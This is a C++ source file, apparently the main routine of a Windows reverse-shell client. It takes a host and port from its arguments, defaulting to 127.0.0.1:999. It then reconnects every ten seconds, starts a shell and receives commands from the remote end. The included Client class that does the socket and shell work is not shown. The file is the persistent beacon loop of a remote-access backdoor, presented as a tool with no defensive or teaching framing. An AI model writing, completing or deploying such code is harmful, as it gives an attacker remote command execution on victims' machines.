#include <thread>
#include <chrono>
// this define stops windows.h including winsock.h
#define _WINSOCKAPI_
// stops windows.h including random shit
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#include "client.hpp"

auto main(int argc, char* argv[]) -> int
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);

	const char* chost;
	unsigned short int cport;
	if (argc == 3) {
		chost = argv[1];
		cport = atoi(argv[2]);
	}
	else {
		chost = "127.0.0.1";
		cport = 999;
	}

	Client client(chost, cport);
	while (1) {
		std::this_thread::sleep_for(std::chrono::seconds(10));
		client.create_socket();
		if (!client.connect_socket()) { continue; }
		else 
		{
			if (!client.check_connection()) { continue; }
			else 
			{
				client.start_shell();
				if (client.receive_commands()) { continue; };
				std::this_thread::sleep_for(std::chrono::seconds(10));
			}
		}
		
	}
	return 0;
}
